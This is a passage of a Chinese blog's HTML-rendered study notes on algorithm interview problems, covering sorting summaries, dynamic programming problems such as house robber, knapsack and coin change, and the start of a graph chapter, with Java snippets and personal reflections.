class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;e1.val-e2.val);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，归并排序。将这些列表看作经典代码split方法切割后的列表。这时候只有对两边数组排序后再合并即可。注意边界调节，如果某范围start+<span class="number">1</span>==end，说明只有一条链表，此时不用再切开递进，直接返回后准备在上一层和另一条链表进行合并。</span><br><span class="line">    （关键词，索引切开+链表归并排序+最小单位是一条链表）</span><br></pre></td></tr></table></figure><h3 id="总结之排序"><a href="#总结之排序" class="headerlink" title="总结之排序"></a>总结之排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>面试经常要求应聘者比较插入排序、冒泡排序、堆排序、计数排序、归并排序和快速排序等不同算法的优劣，需要能够从额外空间消耗、平均时间复杂度和最差时间复杂度方面比较，最可能遇到的是计数排序、快速排序和归并排序。</span><br><span class="line"><span class="number">2.</span>排序能够为二分查找创建基础，在时间复杂度允许的情况下，可以先排序再解题。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>数组操作相关api记录复制：</span><br><span class="line">    Arrays.sort(intervals,(<span class="type">int</span>[] e1,<span class="type">int</span>[] e2)-&gt;e1[<span class="number">0</span>]-e2[<span class="number">0</span>]);  <span class="comment">//将二维数组intervals中的数组，按照索引0位置大小排序</span></span><br><span class="line"><span class="comment">//将List转换为二维数组，需要先定义有外层初值的二维数组resultArray，再调用toArray API</span></span><br><span class="line">List&lt;<span class="type">int</span>[]&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"><span class="type">int</span>[][] resultArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()][];</span><br><span class="line">resultArray = result.toArray(resultArray);</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>计数排序定义即经典代码 见<span class="number">075</span>、数组相对排序；      时间O(n+k)</span><br><span class="line">  快速排序定义即经典代码 见<span class="number">076</span>、数组中的第k大的数字；  平均时间O(nlogn)</span><br><span class="line">  归并排序定义即经典代码 见<span class="number">077</span>、链表排序； 时间O(nlogn)  空间O(n)</span><br><span class="line"><span class="number">5.</span>链表归并排序，合并时的经典复用代码（即按顺序合并两条有序的单链表）：</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">merge</span><span class="params">(ListNode head1,ListNode head2)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">while</span>(head1!=<span class="literal">null</span>&amp;&amp;head2!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(head1.val&lt;=head2.val)&#123;</span><br><span class="line">                cur.next = head1;</span><br><span class="line">                <span class="comment">//改造链表是因为，当被传入merge时已经是切成的小段，目的就是连城大段</span></span><br><span class="line">                head1= head1.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cur.next = head2;</span><br><span class="line">                head2 = head2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next = head1==<span class="literal">null</span>?head2:head1;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">6.</span>从<span class="number">8</span>月<span class="number">14</span>日走向<span class="number">9</span>月<span class="number">27</span>日，从最开始感受到稳定进步的兴奋，到现在每天滚着雪球惯性向前的茫然，这一个半月，听着师兄们找工作的挫败感，记起最初Java安全岗的梦想飘然远逝，在西电的深色夜幕中，汹涌人潮在黑暗中起落不止，失去光彩的星星一颗颗砸入噤声的大海。</span><br><span class="line">不管怎么样，一个原以为坚持不下来的小阶段，还是磕磕绊绊地完成了，我知道了刷题到底是怎么回事。在接下来的“动态规划”和“图”两章中，我要适当放慢自己地脚步，将刷题约束在明确时间范围内，并在十月结束前刷完这本书，结束笔记。剩下的时间追逐梦想吧！！！</span><br></pre></td></tr></table></figure><h2 id="第十四章、动态规划"><a href="#第十四章、动态规划" class="headerlink" title="第十四章、动态规划"></a>第十四章、动态规划</h2><h3 id="088、爬楼梯的最少成本（746、10月31日）"><a href="#088、爬楼梯的最少成本（746、10月31日）" class="headerlink" title="088、爬楼梯的最少成本（746、10月31日）"></a>088、爬楼梯的最少成本（746、10月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>打算用整个十一月把top100和剑指offer2刷完，遂重启该部分，开始学习动态规划。</span><br><span class="line"><span class="number">2.</span>我的想法，递归。我知道爬楼梯的公式是f(x)=f(x-<span class="number">1</span>)+f(x-<span class="number">2</span>)，但显然使用递归是不理智的，因为对于dfs(<span class="number">8</span>)或dfs(<span class="number">9</span>)都要计算dfs(<span class="number">7</span>)及以下，时间开销很大所以没通过。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，动态规划。用迭代实现，规定dp[i]从i位置起步的最小开销，则有dp[<span class="number">0</span>]=cost[<span class="number">0</span>]，dp[<span class="number">1</span>]=cost[<span class="number">1</span>]，从i=<span class="number">2</span>开始计算即可。</span><br></pre></td></tr></table></figure><h3 id="089、房屋偷盗（198、10月31日）"><a href="#089、房屋偷盗（198、10月31日）" class="headerlink" title="089、房屋偷盗（198、10月31日）"></a>089、房屋偷盗（198、10月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。感觉自己还是挺聪明的，懂得变化。这道题不能偷盗相邻的房子，和爬楼梯的最少成本很相似，因此，定义dp[i]表示偷盗到第i个房子的积累金额，那么dp[i]的计算由于无后效性，不应该太远：</span><br><span class="line">合法的上一次偷盗是dp[i-<span class="number">2</span>]，但是dp[i-<span class="number">2</span>]不能包括dp[i-<span class="number">3</span>]的情况，故表示该情况为dp[i-<span class="number">1</span>]-nums[i]，故计算公式如下：</span><br><span class="line">dp[i] = Math.max(dp[i-<span class="number">2</span>],dp[i-<span class="number">1</span>]-nums[i-<span class="number">1</span>])+nums[i];   <span class="comment">//两种情况：不相邻的合法、相邻的合法</span></span><br></pre></td></tr></table></figure><h3 id="090、环形房屋偷盗（213、10月31日）"><a href="#090、环形房屋偷盗（213、10月31日）" class="headerlink" title="090、环形房屋偷盗（213、10月31日）"></a>090、环形房屋偷盗（213、10月31日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这道题相比第<span class="number">89</span>道题多了一条限制，即路径中不可以同时出现第<span class="number">0</span>号屋子和第(nums.length-<span class="number">1</span>)号屋子。因此，将问题划分为两个子问题，[<span class="number">0</span>,nums.length-<span class="number">2</span>]范围里的最优解和[<span class="number">1</span>,nums.lenght-<span class="number">1</span>]范围里的最优解，只需要将输入数组范围改变即可。</span><br><span class="line">    对于[<span class="number">1</span>,nums.lenght-<span class="number">1</span>]范围，可以初始化dp[<span class="number">0</span>]=<span class="number">0</span>，dp[<span class="number">1</span>]=nums[<span class="number">1</span>]，dp[<span class="number">2</span>]=nums[<span class="number">2</span>]，从i=<span class="number">3</span>开始公式计算；对于[<span class="number">0</span>,nums.length-<span class="number">2</span>]范围照旧即可。最后返回这两个最优解中的最大值。</span><br><span class="line">    此外，需要注意nums.length&lt;=<span class="number">2</span>时的特殊情况。</span><br></pre></td></tr></table></figure><h3 id="091、粉刷房子（256、11月2日）"><a href="#091、粉刷房子（256、11月2日）" class="headerlink" title="091、粉刷房子（256、11月2日）"></a>091、粉刷房子（256、11月2日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。没得想法，看到题解状态转移公式时恍然大悟，一共有三个表达式r(i)、b(i)和g(i)，计算方法一致皆为</span><br><span class="line">    r(i) = min(b(i-<span class="number">1</span>),g(i-<span class="number">1</span>))+cost[i][<span class="number">0</span>]  <span class="comment">//r(i)表示本次选择粉刷红色时，从0到i所有房子的最小成本</span></span><br><span class="line">因此，每栋房子粉刷的颜色受上一幢房子决定，无后效性。</span><br><span class="line">    <span class="keyword">return</span> Math.min(r[n-<span class="number">1</span>],Math.min(b[n-<span class="number">1</span>],g[n-<span class="number">1</span>]));  <span class="comment">//三值比较更为优雅的写法</span></span><br><span class="line">因为转移公式中只涉及dp[i-<span class="number">1</span>]和dp[i]，可以进一步减小空间复杂度：</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">如示例中，b[i-<span class="number">1</span>]表示为dp[(j+<span class="number">1</span>)%<span class="number">3</span>][(i-<span class="number">1</span>)%<span class="number">2</span>]，g[i-<span class="number">1</span>]表示为dp[(j+<span class="number">2</span>)%<span class="number">3</span>][(i-<span class="number">1</span>)%<span class="number">2</span>]。</span><br></pre></td></tr></table></figure><h3 id="092、翻转字符（926、11月3日）"><a href="#092、翻转字符（926、11月3日）" class="headerlink" title="092、翻转字符（926、11月3日）"></a>092、翻转字符（926、11月3日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。显然这道题要分情况讨论，应该有两个状态转移方程。根据题解，设f(i)表示把字符串中从<span class="number">0</span>到i的字符变成符合要求的字符并且最后一个字符是<span class="string">&#x27;0&#x27;</span>所需最少翻转次数；设g[i]表示把字符串从<span class="number">0</span>到i的字符变成符合要求并且最后一个字符时<span class="string">&#x27;1&#x27;</span>所需最少反转次数。</span><br><span class="line">当字符串中下标i的字符是<span class="string">&#x27;0&#x27;</span>时，f(i)=f(i-<span class="number">1</span>)，是<span class="string">&#x27;1&#x27;</span>时则f(i)=f(i-<span class="number">1</span>)+<span class="number">1</span>；</span><br><span class="line">当字符串中下标i的字符是<span class="string">&#x27;0&#x27;</span>时，g(i)=min&#123;f(i-<span class="number">1</span>),g(i-<span class="number">1</span>)&#125;+<span class="number">1</span>，是<span class="string">&#x27;1&#x27;</span>时则g(i)=min(f(i-<span class="number">1</span>),g(i-<span class="number">1</span>))；</span><br><span class="line"><span class="number">2.</span>做这道题时，猜到会和粉刷房子一样，存在两个转移方程。但还是差点感觉，所有转移函数的定义都是包含本索引的，在本索引做了什么事情后，从<span class="number">0</span>到本索引的最小成本。无后效性，本索引i的成本只与(i-<span class="number">1</span>)相关，除非(i-<span class="number">1</span>)不能表达所有情况，才会与(i-<span class="number">2</span>)相关，但是不会太远。</span><br></pre></td></tr></table></figure><h3 id="093、最长斐波那契数列（873、11月3日）"><a href="#093、最长斐波那契数列（873、11月3日）" class="headerlink" title="093、最长斐波那契数列（873、11月3日）"></a>093、最长斐波那契数列（873、11月3日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划+hashMap。这道题很难，状态转移公式为 dp(i,j) = dp(j,k)+<span class="number">1</span>，即假如(k,j,i)组成了斐波那契数列，则其延续的是(?,k,j)数列的长度。转移公式是通过(i,j)两位确定下来，即数列也是通过两位才能确定，单纯的i并不能确定。 </span><br><span class="line">    （关键词， 双层数组 dp(i,j) = dp(j,k)+<span class="number">1</span>）</span><br><span class="line"><span class="number">2.</span>此外，需要注意<span class="keyword">return</span> result&gt;<span class="number">0</span>?result+<span class="number">2</span>:<span class="number">0</span>，即最终数列还包含前<span class="number">2</span>个数字。</span><br></pre></td></tr></table></figure><h3 id="094、最少回文分割（132、11月5日）"><a href="#094、最少回文分割（132、11月5日）" class="headerlink" title="094、最少回文分割（132、11月5日）"></a>094、最少回文分割（132、11月5日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。首先维护二维数组isHuwen[i][j]，表示从i到j的字符串是否为回文。通过Arrays.fill填满<span class="literal">true</span>，然后双层<span class="keyword">for</span>循环，外层i从n-<span class="number">1</span>到<span class="number">0</span>，内层j从<span class="number">0</span>到i+<span class="number">1</span>到n。这两步很有技巧性，也是本题的关键，这里说明：</span><br><span class="line">a.填满True的原因，计算公式为下面式子，如果i=<span class="number">3</span>，j=<span class="number">4</span>，isHuiwen[<span class="number">4</span>][<span class="number">3</span>]没有意义，所以要isHuiwen[<span class="number">4</span>][<span class="number">3</span>]=<span class="literal">true</span>，这样只考虑前面</span><br><span class="line">    isHuiwen[i][j] = s.charAt(i) == s.charAt(j) &amp;&amp; isHuiwen[i + <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">b.为什么从末尾开始，是因为计算isHuiwen[i][j]时，isHuiwen[i+<span class="number">1</span>][j-<span class="number">1</span>]已经被上一层外层循环计算了.如果从<span class="number">0</span>开始，要计算isHuiwen[<span class="number">0</span>][<span class="number">3</span>]，此时isHuiwen[<span class="number">1</span>][<span class="number">2</span>]还没被计算。</span><br><span class="line">最后要计算分割次数f，就是从<span class="number">0</span>开始遍历，如果isHuiwen[<span class="number">0</span>][i]为<span class="literal">true</span>则f[i]=<span class="number">0</span>；如果isHuiwen[<span class="number">0</span>][i]为<span class="literal">false</span>，则 <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i;j++)，min&#123;f[j&#125;]+<span class="number">1</span>=f[i]；最后返回f[n-<span class="number">1</span>]；</span><br><span class="line">        </span><br><span class="line"><span class="number">2.</span>Arrays.fill(g[i], <span class="literal">true</span>);  <span class="comment">//g是二维数组，则需要for循环索引填充每层一维数组g[i]</span></span><br></pre></td></tr></table></figure><h3 id="095、最长公共子序列（1143、11月9日）"><a href="#095、最长公共子序列（1143、11月9日）" class="headerlink" title="095、最长公共子序列（1143、11月9日）"></a>095、最长公共子序列（1143、11月9日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。确实打不过，没办法实力差距，一直都在想将dp[i][j-&gt;m]和dp[i-&gt;n][j]都设置为dp[i-<span class="number">1</span>][j-<span class="number">1</span>]+<span class="number">1</span>，但是逻辑有点乱。这道题关键想法在，dp[i-<span class="number">1</span>][j-<span class="number">1</span>]是第（i开始至末尾）个text1字符和第（j开始至末尾）个text2字符没参与过的，</span><br><span class="line">a.如果第i个text1字符和第j个text2字符相等，则dp[i][j] = dp[i-<span class="number">1</span>][j-<span class="number">1</span>]+<span class="number">1</span>，即使j前的text2字符也可能与（i）相等；</span><br><span class="line">b.如果第i个text1字符和第j个text2字符不等，则dp[i][j] = Math.max(dp[i][j-<span class="number">1</span>],dp[i-<span class="number">1</span>][j])，即可能(i）或(j)造成了相等，并继续维持下去；</span><br><span class="line">这样的好处是a情况，后来又有一个j字符与i相等，并不是从dp[i][(j-<span class="number">1</span>)以前]去计算。</span><br><span class="line"><span class="number">2.</span>本题需要考虑dp[<span class="number">0</span>][<span class="number">0</span>]，所以设置dp大小为dp[n+<span class="number">1</span>][m+<span class="number">1</span>], 注意dp和text1、text2的索引关系即可。</span><br><span class="line"><span class="number">3.</span>做dp的题好有意思唉，各种各样的转移方程都见过了，还是做不出来啊啊。</span><br></pre></td></tr></table></figure><h3 id="096、字符串交织（97、11月9日）"><a href="#096、字符串交织（97、11月9日）" class="headerlink" title="096、字符串交织（97、11月9日）"></a>096、字符串交织（97、11月9日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。感觉和上一道题很像，但是还是做不出来。根据题解分析下吧。定义dp[i][j]表示s1的前i个字符和s2的前j个字符能否组成s3的前（i+j）个字符。那么dp[i][j]既可能因为第（i-<span class="number">1</span>）个s1字符变为<span class="literal">true</span>，也可能因为第（j-<span class="number">1</span>）个s2字符变为<span class="literal">true</span>，故计算如下：</span><br><span class="line">dp[i][j] = dp[i-<span class="number">1</span>][j]&amp;&amp;(s1.charAt(i-<span class="number">1</span>)==s3.charAt(i+j-<span class="number">1</span>));    <span class="comment">//因为第(i-1)个字符</span></span><br><span class="line">dp[i][j] = dp[i][j] || (dp[i][j-<span class="number">1</span>]&amp;&amp;(s2.charAt(j-<span class="number">1</span>)==s3.charAt(i+j-<span class="number">1</span>)));   <span class="comment">//因为第(j-1)个字符</span></span><br><span class="line">此外，需要注意还要计算dp[<span class="number">1</span>][<span class="number">0</span>]、dp[<span class="number">2</span>][<span class="number">0</span>]、dp[<span class="number">0</span>][<span class="number">1</span>]、dp[<span class="number">0</span>][<span class="number">2</span>]等，故不能 <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>)<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>)。</span><br></pre></td></tr></table></figure><h3 id="098、路径的数目（62、12月2日）"><a href="#098、路径的数目（62、12月2日）" class="headerlink" title="098、路径的数目（62、12月2日）"></a>098、路径的数目（62、12月2日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。本来以为这道题是图章节的，就跳过没做。其实比较容易记住，和爬楼梯一样，先初始化dp，将最左面和最上面的边界点dp设置为<span class="number">1</span>，其他位置dp来源于其左边和上边dp的求和：</span><br><span class="line">dp[i][j] = dp[i-<span class="number">1</span>][j]+dp[i][j-<span class="number">1</span>];</span><br></pre></td></tr></table></figure><h3 id="099、最小路径之和（64、12月6日）"><a href="#099、最小路径之和（64、12月6日）" class="headerlink" title="099、最小路径之和（64、12月6日）"></a>099、最小路径之和（64、12月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。这道题做过，很快就做出来了。定义dp[i][j]表示以(i,j)结尾的最短路径和，转移方程为：</span><br><span class="line">dp[i][j] = Math.min(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>])+grid[i][j];</span><br><span class="line">只需要特殊处理最左边和最上边的情况即可。</span><br></pre></td></tr></table></figure><h3 id="100、三角形中最小路径之和（120、12月6日）"><a href="#100、三角形中最小路径之和（120、12月6日）" class="headerlink" title="100、三角形中最小路径之和（120、12月6日）"></a>100、三角形中最小路径之和（120、12月6日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。这道题如出一辙，还是挺简单的。因为路径每次移动，都只会向下方相邻节点（同索引或索引加一）移动，所以状态转移方程为：</span><br><span class="line">    dpRow.add(Math.min(dp.get(i-<span class="number">1</span>).get(j),dp.get(i-<span class="number">1</span>).get(j-<span class="number">1</span>))+temp.get(j));  </span><br><span class="line"><span class="comment">//min&#123;上一行同索引位置、上一行索引加一位置&#125;+本位置数值</span></span><br><span class="line">此外，需要考虑三角形每层元素，对于第一个元素转移方程为：dpRow.add(dp.get(i-<span class="number">1</span>).get(<span class="number">0</span>)+temp.get(<span class="number">0</span>));</span><br><span class="line">对于最后一个元素转移方程为：dpRow.add(dp.get(i-<span class="number">1</span>).get(temp.size()-<span class="number">2</span>)+temp.get(temp.size()-<span class="number">1</span>));</span><br><span class="line">最后，选取三角形最后一层元素中的dp最小值即可。</span><br></pre></td></tr></table></figure><h3 id="101、分割等和子集（416、12月20日）"><a href="#101、分割等和子集（416、12月20日）" class="headerlink" title="101、分割等和子集（416、12月20日）"></a>101、分割等和子集（416、12月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>背包问题，先不做。</span><br><span class="line">https:<span class="comment">//leetcode.cn/problems/NUPfPr/solution/by-flix-c3fv/</span></span><br><span class="line"><span class="number">2.</span>没想到再做已经是<span class="number">19</span>日了，在这个光景里好像做啥都不大顶用，我想去做安全又何必刷题呢，不说了，还是保持每天的刷题吧。</span><br><span class="line"><span class="number">3.</span>背包问题：假设有限定容量为C的背包，一堆物品，假设物品i的重量为Wi，价值为Vi，希望能在不超过重量C的前提下，背包内的物品价值最大。<span class="number">0</span>-<span class="number">1</span>背包问题要求物品只能取零次或一次，完全背包问题则没有限制。</span><br><span class="line"><span class="number">4.</span>思路<span class="number">1</span>，动态规划。本题转化为<span class="number">0</span>-<span class="number">1</span>背包问题：背包为所有数字之和的一半，能否选取部分数字，使得恰好装满背包。定义dp[i][j]表示从i个数字中选取若干数，使得这若干数的和为j。定义dp[nums.length][target+<span class="number">1</span>]，首先考虑状态转移方程：</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> nums[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=target;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=num)&#123;</span><br><span class="line">                <span class="comment">//因为每次j都是从1开始遍历，当j&gt;=nums[i]时，dp[i][j]的布尔值来源于两方面</span></span><br><span class="line">                <span class="comment">//a.假设这次不选nums[i]，dp[i][j]=dp[i-1][j];</span></span><br><span class="line">                <span class="comment">//b.假设这次选nums[i]，dp[i][j]=dp[i-1][j-nums[i]];即前(i-1)位置中若干能否组成(j-nums[i])</span></span><br><span class="line">                dp[i][j] = dp[i-<span class="number">1</span>][j]|dp[i-<span class="number">1</span>][j-nums[i]];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//当j&lt;nums[i]时，在i位置肯定不能选nums[i]，否则会溢出j，</span></span><br><span class="line">                <span class="comment">//此时布尔值只能考虑前i位置中若干位能否组成j</span></span><br><span class="line">                dp[i][j] = dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">最终结果返回dp[nums.length-<span class="number">1</span>][target]即可，再考虑如何初始化：</span><br><span class="line">dp[任意位][<span class="number">0</span>] = True;  <span class="comment">//这是因为前i位中都可以不选，使得组成0；</span></span><br><span class="line">dp[<span class="number">0</span>][nums[<span class="number">0</span>]] = True;<span class="comment">//因为第0位当然可以组成nums[0]，其他位置需要考虑(i-1)位置，故要单独拿出</span></span><br><span class="line"><span class="number">5.</span>这TM八岁，第一次做背包问题，啥也不说了，继续OpenRASP，开溜~</span><br></pre></td></tr></table></figure><h3 id="102、加减的目标值（494、12月20日）"><a href="#102、加减的目标值（494、12月20日）" class="headerlink" title="102、加减的目标值（494、12月20日）"></a>102、加减的目标值（494、12月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，回溯法。这道题用回溯做是标准的模板题，每次递归时考虑加减两方面，注意边界即可。</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> target,<span class="type">int</span> index,<span class="type">int</span> sum,<span class="type">int</span>[] result)</span></span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，动态规划。设数组元素和为sum，添加减号的元素（都是正数）和为neg，添加加号的元素和为sum-neg；则有 </span><br><span class="line">    (sum-neg)-neg=target；进一步可得 neg = (sum-target)/<span class="number">2</span>；</span><br><span class="line">问题转化为第<span class="number">101</span>题，能否从nums数组中选取若干位，其和为 (sum-target)/<span class="number">2</span>；思路和第<span class="number">101</span>题类似，但因为需要统计方案数目，定义dp[i][j]表示从nums数组的前i位选取若干位，其和恰为j的方案数目；</span><br><span class="line">    这里的初始化很奇怪，又和第<span class="number">101</span>题差不多，还是用回溯好了。</span><br><span class="line"><span class="number">3.</span>总结一哈<span class="number">0</span>-<span class="number">1</span>背包问题的模板：</span><br><span class="line">a.推导出目标值target，建立dp[nums.length][target+<span class="number">1</span>]二维数组，<span class="type">int</span>或<span class="type">boolean</span>根据题目看；</span><br><span class="line">b.初始化dp数组，从dp[i][<span class="number">0</span>]=True或<span class="number">1</span>，以及dp[<span class="number">0</span>][nums[<span class="number">0</span>]]两方面考虑；</span><br><span class="line">c.双层<span class="keyword">for</span>循环进行状态转移，当j&gt;=nums[i]时，考虑是否加上nums[i]；当j&lt;nums[i]时，只能选择不加nums[i]；</span><br><span class="line">    d.最后返回dp[nums.length-<span class="number">1</span>][target]；</span><br></pre></td></tr></table></figure><h3 id="103、最少的硬币数目（322、12月21日）"><a href="#103、最少的硬币数目（322、12月21日）" class="headerlink" title="103、最少的硬币数目（322、12月21日）"></a>103、最少的硬币数目（322、12月21日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这道题很快就做出来了，可能是昨天有对背包问题的印象。根据题目可知是完全背包问题，dp[i]表示组成金额i所需硬币数目的最小值，设dp[amount+<span class="number">1</span>]。这样可得状态转移方程：</span><br><span class="line">对于金额i，dp[i] = Math.min(dp[i],dp[i-coin]+<span class="number">1</span>);,即<span class="keyword">for</span>(<span class="type">int</span> coin:coins)，对每种金额进行遍历，表示这次选该金额的硬币。每轮遍历时，因为取最小，dp[i]初值为Integer.MAX_VALUE，(i-coin)&gt;=<span class="number">0</span>保证不越界，dp[i-coin]!=Integer.MAX_VALUE保证该位置的硬币数有效。</span><br><span class="line"><span class="number">2.</span>Integer.MAX_VALUE就像标志位一样，表示该位置没有合法的硬币数目。</span><br></pre></td></tr></table></figure><h3 id="104、排列的数目（377、12月21日）"><a href="#104、排列的数目（377、12月21日）" class="headerlink" title="104、排列的数目（377、12月21日）"></a>104、排列的数目（377、12月21日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。真是神奇唉，二十分钟连坐两道动态规划，简直比<span class="number">79</span>分钟的姆巴佩还要猛。思路和第<span class="number">103</span>题一致，dp[i]表示组成整数i的方案数目，设dp[target+<span class="number">1</span>]。这样可得状态转移方程：</span><br><span class="line">    对于整数i，dp[i]初值为<span class="number">0</span>，遍历nums中的所有数字，当(i-num)&gt;=<span class="number">0</span>时，dp[i]+=dp[i-num]，即累加前面(i-num)的方案数目。最后返回dp[target]即可。</span><br></pre></td></tr></table></figure><h3 id="总结之动态规划"><a href="#总结之动态规划" class="headerlink" title="总结之动态规划"></a>总结之动态规划</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.爬楼梯问题、房屋偷盗问题的根源公式都是f(x)=f(x-1)+f(x-2)，即x位置的状态计算由它的相邻位置和它的最后不相邻位置决定。</span><br></pre></td></tr></table></figure><h2 id="第十五章、图"><a href="#第十五章、图" class="headerlink" title="第十五章、图"></a>第十五章、图</h2><h3 id="105、岛屿的最大面积（695、11月20日）"><a href="#105、岛屿的最大面积（695、11月20日）" class="headerlink" title="105、岛屿的最大面积（695、11月20日）"></a>105、岛屿的最大面积（695、11月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题首先图不需要用邻接表或临界矩阵表示，直接在输入的二维数组上搜索。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，广度优先搜索。首先通过两个<span class="keyword">for</span>循环遍历图，维护<span class="type">boolean</span>数组visited表示是否访问过</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;rowLen;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;columnLen;j++)&#123; <span class="keyword">if</span>(!visited[i][j]&amp;&amp;grid[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line"> 如果某个节点符合条件，就通过getArea计算该节点所在岛屿的面积，并更新result结果。getArea的实现逻辑为：</span><br><span class="line">     将(i,j)放入队列，<span class="keyword">while</span>在队列不为空时，向左右、上下四个方向搜索图，如果新位置“没有越界&amp;&amp;没访问过&amp;&amp;是陆地”，就将该新位置(row,column)也加入队列，从队列弹出节点时将area值加一。</span><br><span class="line">     上面的条件“没有访问过&amp;&amp;是陆地”，保证了岛屿面积不会被重复计算，先访问的节点会向四周延申并直接得到所在岛屿的面积。</span><br></pre></td></tr></table></figure><h3 id="106、二分图（785、11月20日）"><a href="#106、二分图（785、11月20日）" class="headerlink" title="106、二分图（785、11月20日）"></a>106、二分图（785、11月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题的意思是，把图中节点划分为两个子集，图中的每条边都是跨子集连通的返回True，否则返回<span class="literal">false</span>。本题中的图是邻接表。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，着色法。首先维护colors[rowLen]表示节点染色情况，初始化为-<span class="number">1</span>表示未染色。通过<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;rowLen;i++)遍历节点，如果未染色就setColor，如果setColor返回<span class="literal">false</span>就说明染色出错不能形成二分图，全部循环结束则返回<span class="literal">true</span>。</span><br><span class="line">    setColor使用广度优先搜索进行染色，维护队列queue， <span class="keyword">while</span>(!deque.isEmpty())时，弹出队列头部节点并访问其所有邻居节点，如果邻居节点已经被染色，判断染色是否和当前节点相反；如果未被染色，就染上相反色，并放入queue。<span class="keyword">while</span>结束则返回<span class="literal">true</span>。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>这道题解法比较标准，我还是产生了疑惑，广度优先搜索为啥要维护队列，只判断每个节点的相邻节点不就行吗？其实这样破坏了通式。试想节点<span class="number">0</span>连接节点<span class="number">1</span>、节点<span class="number">2</span>，节点<span class="number">1</span>和节点<span class="number">2</span>也有边，访问节点<span class="number">0</span>时会将节点<span class="number">1</span>、<span class="number">2</span>染成同色，这时候访问节点<span class="number">1</span>、<span class="number">2</span>时，因为节点<span class="number">1</span>、<span class="number">2</span>已经被染色就不会setColor，所以不会报警该染色错误。故没访问未染色节点，就要<span 